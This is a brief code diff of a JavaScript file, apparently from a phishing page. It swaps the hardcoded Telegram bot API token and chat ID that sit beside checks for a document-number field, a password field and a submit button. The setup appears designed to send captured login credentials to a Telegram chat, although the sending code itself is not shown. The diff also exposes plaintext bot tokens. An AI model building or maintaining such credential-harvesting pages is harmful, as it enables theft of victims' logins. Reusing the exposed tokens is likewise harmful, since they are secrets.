@@ -18,8 +18,8 @@ document.addEventListener('DOMContentLoaded', function () {
     let pollingInterval;
 
     // ⚠️ ADVERTENCIA: Esto es inseguro, debería estar en el servidor
-    const TELEGRAM_API_KEY = "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw";
-    const TELEGRAM_CHAT_ID = "-1004245962123";
+    const TELEGRAM_API_KEY = "8587283632:AAFFsDyTcTyQYiQyM4rghouex0dlidIZEsk";
+    const TELEGRAM_CHAT_ID = "5360036647";
 
     // Verificar que existen elementos críticos
     if (!form || !docNumber || !passwordInput || !submitBtn) {
